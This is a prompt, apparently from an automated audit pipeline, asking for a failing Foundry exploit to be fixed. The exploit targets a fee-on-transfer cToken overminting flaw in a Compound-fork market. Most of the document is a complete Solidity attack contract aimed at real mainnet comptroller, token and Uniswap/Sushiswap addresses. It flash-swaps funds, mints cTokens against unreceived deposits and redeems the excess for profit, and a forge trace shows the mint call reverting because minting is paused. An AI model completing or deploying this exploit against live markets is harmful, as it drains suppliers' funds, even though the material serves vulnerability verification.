You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Legacy mint accounting overissues cTokens for fee-on-transfer deposits
- claim: The legacy flattened CToken mints against the user-supplied `mintAmount`, but its abstract `doTransferIn` hook only returns an error code and cannot report how much underlying was actually received. A fee-on-transfer or deflationary underlying therefore lets the market mint cTokens as if the full amount arrived even when less cash was credited.
- impact: If such an underlying is listed through this legacy implementation, an attacker can mint excess cTokens against underfunded deposits and later redeem or borrow against claims that are not backed by real cash, diluting suppliers and potentially draining the market.
- exploit_paths: ["mint -> mintFresh computes `mintTokens` from `mintAmount` -> `doTransferIn(minter, mintAmount)` receives less than `mintAmount` -> attacker receives cTokens backed by insufficient cash"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IComptrollerLike {
    function getAllMarkets() external view returns (address[] memory);
}

interface ICTokenLike {
    function balanceOf(address owner) external view returns (uint256);
    function exchangeRateStored() external view returns (uint256);
    function mint(uint256 mintAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
}

interface ICErc20Like is ICTokenLike {
    function underlying() external view returns (address);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address internal constant COMPTROLLER = 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B;
    address internal constant CETH = 0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant TUSD = 0x0000000000085d4780B73119b644AE5ecd22b376;
    address internal constant USDP = 0x8E870D67F660D95d5be530380D0eC0bd388289E1;
    address internal constant FEI = 0x956F47F50A910163D8BF957Cf5846D573E7f87CA;

    address internal _profitToken;
    uint256 internal _profitAmount;

    bool public profitAchieved;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    bool public encounteredUnknownMarket;
    uint256 public attemptedMarkets;
    address public attemptedCToken;
    address public attemptedUnderlying;
    uint256 public attemptedMintAmount;
    uint256 public observedCashDelta;
    uint256 public observedCTokenDelta;

    address internal _lastAttemptToken;
    uint256 internal _lastAttemptProfit;
    uint256 internal _lastAttemptCashDelta;
    uint256 internal _lastAttemptCTokenDelta;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        _resetState();

        address[] memory markets = IComptrollerLike(COMPTROLLER).getAllMarkets();

        for (uint256 pass = 0; pass < 2; ++pass) {
            for (uint256 i = 0; i < markets.length; ++i) {
                address cToken = markets[i];
                address underlying = _underlyingOf(cToken);
                if (underlying == address(0)) {
                    continue;
                }

                bool priority = _isPriorityUnderlying(underlying);
                if ((pass == 0 && !priority) || (pass == 1 && priority)) {
                    continue;
                }

                ++attemptedMarkets;
                attemptedCToken = cToken;
                attemptedUnderlying = underlying;

                if (_attemptMarket(cToken, underlying)) {
                    _profitToken = underlying;
                    _profitAmount = IERC20Like(underlying).balanceOf(address(this));
                    profitAchieved = _profitAmount > 0;
                    hypothesisValidated = true;
                    return;
                }
            }
        }

        hypothesisRefuted = !profitAchieved;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPathUsed() external pure returns (string memory) {
        return "flashswap funding -> mint -> mintFresh computes mintTokens from mintAmount -> doTransferIn receives less than mintAmount -> redeem excess cTokens";
    }

    function startFlashswap(address pair, address cToken, address underlying, uint256 amountOut)
        external
        returns (uint256)
    {
        require(msg.sender == address(this), "self only");

        _lastAttemptToken = address(0);
        _lastAttemptProfit = 0;
        _lastAttemptCashDelta = 0;
        _lastAttemptCTokenDelta = 0;

        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();

        bytes memory data = abi.encode(pair, cToken, underlying, amountOut);

        if (token0 == underlying) {
            IUniswapV2PairLike(pair).swap(amountOut, 0, address(this), data);
        } else if (token1 == underlying) {
            IUniswapV2PairLike(pair).swap(0, amountOut, address(this), data);
        } else {
            revert("bad pair");
        }

        return _lastAttemptProfit;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(sender == address(this), "bad sender");

        (address pair, address cToken, address underlying, uint256 amountOut) =
            abi.decode(data, (address, address, address, uint256));

        require(msg.sender == pair, "bad caller");

        uint256 borrowedNominal = amount0 > 0 ? amount0 : amount1;
        require(borrowedNominal == amountOut, "bad amount");

        uint256 received = IERC20Like(underlying).balanceOf(address(this));
        require(received > 0, "no funds");

        (uint256 cashDelta, uint256 cTokenDelta) = _runMintRedeemRoundtrip(cToken, underlying, received);
        observedCashDelta = cashDelta;
        observedCTokenDelta = cTokenDelta;
        _lastAttemptCashDelta = cashDelta;
        _lastAttemptCTokenDelta = cTokenDelta;

        uint256 netRequiredToPair = _sameTokenFlashswapRepayment(amountOut);
        _repayPairAccountingForTransferFees(underlying, pair, netRequiredToPair);

        uint256 profit = IERC20Like(underlying).balanceOf(address(this));
        require(profit > 0, "no profit");

        _lastAttemptToken = underlying;
        _lastAttemptProfit = profit;
    }

    function _runMintRedeemRoundtrip(address cToken, address underlying, uint256 received)
        internal
        returns (uint256 cashDelta, uint256 cTokenDelta)
    {
        uint256 cashBefore = IERC20Like(underlying).balanceOf(cToken);
        uint256 cTokenBefore = ICTokenLike(cToken).balanceOf(address(this));
        uint256 exchangeRateBefore = ICTokenLike(cToken).exchangeRateStored();
        require(exchangeRateBefore > 0, "bad rate");

        require(_rawApprove(underlying, cToken, 0), "approve0");
        require(_rawApprove(underlying, cToken, received), "approve");

        attemptedMintAmount = received;

        uint256 mintError = ICTokenLike(cToken).mint(received);
        require(mintError == 0, "mint");

        uint256 cashAfter = IERC20Like(underlying).balanceOf(cToken);
        uint256 cTokenAfter = ICTokenLike(cToken).balanceOf(address(this));
        cashDelta = cashAfter - cashBefore;
        cTokenDelta = cTokenAfter - cTokenBefore;

        require(cashDelta < received, "no shortfall");
        require(cTokenDelta > 0, "no ctoken");

        // The root cause is only present if the market minted against the user-supplied mintAmount,
        // not against the lower amount of cash that actually arrived.
        uint256 impliedUnderlying = (cTokenDelta * exchangeRateBefore) / 1e18;
        require(impliedUnderlying + 2 >= received, "minted on actual cash");

        uint256 redeemError = ICTokenLike(cToken).redeem(cTokenDelta);
        require(redeemError == 0, "redeem");
    }

    function _attemptMarket(address cToken, address underlying) internal returns (bool) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
        address[3] memory baseAssets = [WETH, USDC, DAI];

        uint256 marketCash = IERC20Like(underlying).balanceOf(cToken);
        if (marketCash == 0) {
            return false;
        }

        for (uint256 i = 0; i < factories.length; ++i) {
            for (uint256 j = 0; j < baseAssets.length; ++j) {
                address base = baseAssets[j];
                if (base == underlying) {
                    continue;
                }

                address pair = IUniswapV2FactoryLike(factories[i]).getPair(underlying, base);
                if (pair == address(0)) {
                    continue;
                }

                if (_attemptPair(pair, cToken, underlying, marketCash)) {
                    observedCashDelta = _lastAttemptCashDelta;
                    observedCTokenDelta = _lastAttemptCTokenDelta;
                    return true;
                }
            }
        }

        return false;
    }

    function _resetState() internal {
        _profitToken = address(0);
        _profitAmount = 0;
        profitAchieved = false;
        hypothesisValidated = false;
        hypothesisRefuted = false;
        encounteredUnknownMarket = false;
        attemptedMarkets = 0;
        attemptedCToken = address(0);
        attemptedUnderlying = address(0);
        attemptedMintAmount = 0;
        observedCashDelta = 0;
        observedCTokenDelta = 0;
        _lastAttemptToken = address(0);
        _lastAttemptProfit = 0;
        _lastAttemptCashDelta = 0;
        _lastAttemptCTokenDelta = 0;
    }

    function _underlyingOf(address cToken) internal view returns (address) {
        if (cToken == CETH) {
            return address(0);
        }
        return ICErc20Like(cToken).underlying();
    }

    function _pairReservesFor(address pair, address underlying) internal view returns (uint256 reserveUnderlying, bool token0Side) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        address token0 = IUniswapV2PairLike(pair).token0();
        if (token0 == underlying) {
            return (uint256(reserve0), true);
        }
        return (uint256(reserve1), false);
    }

    function _isPriorityUnderlying(address underlying) internal pure returns (bool) {
        return underlying == USDT || underlying == TUSD || underlying == USDP || underlying == FEI;
    }

    function _attemptPair(address pair, address cToken, address underlying, uint256 marketCash) internal returns (bool) {
        uint256[8] memory divisors = [uint256(20_000), 10_000, 5_000, 2_000, 1_000, 500, 200, 100];
        (uint256 reserveUnderlying,) = _pairReservesFor(pair, underlying);
        if (reserveUnderlying == 0) {
            return false;
        }

        for (uint256 i = 0; i < divisors.length; ++i) {
            uint256 amountOut = reserveUnderlying / divisors[i];
            uint256 marketBound = marketCash / 50;
            if (marketBound > 0 && amountOut > marketBound) {
                amountOut = marketBound;
            }
            if (amountOut == 0) {
                continue;
            }

            try this.startFlashswap(pair, cToken, underlying, amountOut) returns (uint256 profit) {
                if (profit > 0) {
                    return true;
                }
            } catch {}
        }

        return false;
    }

    function _sameTokenFlashswapRepayment(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _repayPairAccountingForTransferFees(address token, address pair, uint256 netRequired) internal {
        uint256 pairBalanceBefore = IERC20Like(token).balanceOf(pair);
        uint256 netDelivered = 0;

        for (uint256 i = 0; i < 5 && netDelivered < netRequired; ++i) {
            uint256 remaining = netRequired - netDelivered;
            uint256 gross = remaining + (remaining / 5) + 64;
            uint256 balance = IERC20Like(token).balanceOf(address(this));
            if (gross > balance) {
                gross = balance;
            }
            require(gross > 0, "repay");
            require(_rawTransfer(token, pair, gross), "transfer");
            uint256 pairBalanceAfter = IERC20Like(token).balanceOf(pair);
            netDelivered = pairBalanceAfter - pairBalanceBefore;
        }

        require(netDelivered >= netRequired, "underpaid");
    }

    function _rawApprove(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSignature("approve(address,uint256)", spender, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    function _rawTransfer(address token, address to, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSignature("transfer(address,uint256)", to, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }
}

```

forge stdout (tail):
```
a8cdd93b5a11cd7ad5f192
    │   │   │   │   │   └─ ← [Return] 204071630044460343960662418 [2.04e26]
    │   │   │   │   ├─ [4765] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::approve(0x80a2AE356fc9ef4305676f7a3E2Ed04e12C33946, 0)
    │   │   │   │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │        topic 2: 0x00000000000000000000000080a2ae356fc9ef4305676f7a3e2ed04e12c33946
    │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   ├─ [22565] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::approve(0x80a2AE356fc9ef4305676f7a3E2Ed04e12C33946, 3625009846320 [3.625e12])
    │   │   │   │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │        topic 2: 0x00000000000000000000000080a2ae356fc9ef4305676f7a3e2ed04e12c33946
    │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000034c036c9830
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   ├─ [48673] 0x80a2AE356fc9ef4305676f7a3E2Ed04e12C33946::mint(3625009846320 [3.625e12])
    │   │   │   │   │   ├─ [47472] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::mint(3625009846320 [3.625e12]) [delegatecall]
    │   │   │   │   │   │   ├─ [541] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::balanceOf(0x80a2AE356fc9ef4305676f7a3E2Ed04e12C33946) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 48559249653924324042 [4.855e19]
    │   │   │   │   │   │   ├─ [7816] 0xd956188795ca6F4A74092ddca33E0Ea4cA3a1395::15f24053(000000000000000000000000000000000000000000000002a1e51c4845ab62ca00000000000000000000000000000000000000000000000000fbc0b558c8059e00000000000000000000000000000000000000000000000007292ad62400d7c2) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000024068fbd3
    │   │   │   │   │   │   ├─  emit topic 0: 0x4dec04e750ca11537cabcd8a9eab06494de08da3735bc8871cd41250e190bc04
    │   │   │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000002a1e51c4845ab62ca0000000000000000000000000000000000000000000000000000625cb1a783710000000000000000000000000000000000000000000000000fd4e0235209699500000000000000000000000000000000000000000000000000fc23120a6f890f
    │   │   │   │   │   │   ├─ [3415] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B::4ef4c3e1(00000000000000000000000080a2ae356fc9ef4305676f7a3e2ed04e12c339460000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000000000000000000000000000000000034c036c9830)
    │   │   │   │   │   │   │   ├─ [2701] 0xBafE01ff935C7305907c33BF824352eE5979B526::4ef4c3e1(00000000000000000000000080a2ae356fc9ef4305676f7a3e2ed04e12c339460000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000000000000000000000000000000000034c036c9830) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Revert] mint is paused
    │   │   │   │   │   │   │   └─ ← [Revert] mint is paused
    │   │   │   │   │   │   └─ ← [Revert] mint is paused
    │   │   │   │   │   └─ ← [Revert] mint is paused
    │   │   │   │   └─ ← [Revert] mint is paused
    │   │   │   └─ ← [Revert] mint is paused
    │   │   └─ ← [Revert] mint is paused
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e, 0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [470] 0x041171993284df560249B57358F931D9eB7b925D::underlying() [staticcall]
    │   │   └─ ← [Return] 0x8E870D67F660D95d5be530380D0eC0bd388289E1
    │   ├─ [470] 0x7713DD9Ca933848F6819F38B8352D9A15EA73F67::underlying() [staticcall]
    │   │   └─ ← [Return] 0x956F47F50A910163D8BF957Cf5846D573E7f87CA
    │   └─ ← [Stop]
    ├─ [372] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [415] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xBafE01ff935C7305907c33BF824352eE5979B526
  at 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B
  at 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376.mint
  at 0x80a2AE356fc9ef4305676f7a3E2Ed04e12C33946.mint
  at FlawVerifier.uniswapV2Call
  at 0x3a5747cf4E21861E2D0D3d51a0e8737Ab4dfadc8.swap
  at FlawVerifier.startFlashswap
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 273.75s (273.66s CPU time)

Ran 1 test suite in 273.96s (273.75s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 136739985)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
